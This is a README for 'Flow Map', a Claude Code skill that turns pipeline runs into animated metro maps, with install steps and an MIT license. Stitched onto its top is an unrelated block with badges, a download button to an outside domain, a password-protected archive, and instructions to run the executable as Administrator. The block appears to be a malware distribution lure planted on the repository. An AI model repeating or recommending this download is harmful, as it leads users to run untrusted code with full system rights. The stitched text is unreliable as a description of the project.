<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Flow Map

**A Claude Code skill that turns your pipeline into an animated metro map, replayed from what a real run recorded.**

## What it does

Ask Claude Code for a flow map and the skill:

1. **Audits your code first.** It finds what a run actually records (log lines, tables, events), with `file:line` for each stage, and shows you a table of what can and can't be drawn before it builds anything.
2. **Adds one read-only endpoint** that turns a run into a flow model, with tests.
3. **Builds the map** with the bundled engine (React + SVG, no other dependencies) in your own colours, light and dark.
4. **Checks its own work.** It screenshots the map mid-replay and at the end, looks for overlaps and clipped labels, and fixes them before showing you.
5. **Writes a short runbook** so the map can be kept current as your pipeline changes (and offers a daily routine for it).

## The visual language

| Shape | Means |
|-------|-------|
| Thick bar | Start, release, finish |
| Stop (ring + dot) | One step |
| Pill + progress bars | A step that fans out to several sources and waits |
| Grey box of parallel rails | Items handled side by side |
| Red arc above a rail | A retry: "try 2 of 3" → "published in try 2" |
| Hub with spokes | A set of checks, one spoke per gate; red when it sent something back |
| Double red spoke | The retry path out of a hub |
| Checkboxes by a bar | Conditions met at release |
| Avatar under a dotted line | Who receives the result |

Three colours only: **accent** = in progress, **red** = sent back, **ink** = done. Rows snake left → right, round a corner, right → left. A capsule carries the run along the line; stops glow while active and pop when they resolve; spokes are dashed while checking; bars fill one by one. Stage chips jump through the replay, and every stop opens a detail panel with the real numbers.

## Install

Copy the skill into your skills folder:

```bash
# for every project
cp -r flow-map/skill/flow-map ~/.claude/skills/
# or for one project
cp -r flow-map/skill/flow-map your-project/.claude/skills/
```

Then, in Claude Code inside your project:

> Make me a flow map of our pipeline, from real run data.

The skill stops after the audit and asks for your OK before it builds.

## Try the demo

An invented release pipeline (CI, test shards, canary deploys with a rollback, release checks) that uses every shape:

```bash
cd flow-map/demo
npm install
npm run dev
```

## Principles

- **Real data only.** If a run doesn't record something, it stays pale, and the skill tells you the smallest logging change that would make it visible.
- **Inferences are stated** in the detail panel, never hidden.
- **Order is real.** Rows follow the order the run actually happened in.


---

MIT License

Copyright (c) 2026 PeterOla

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
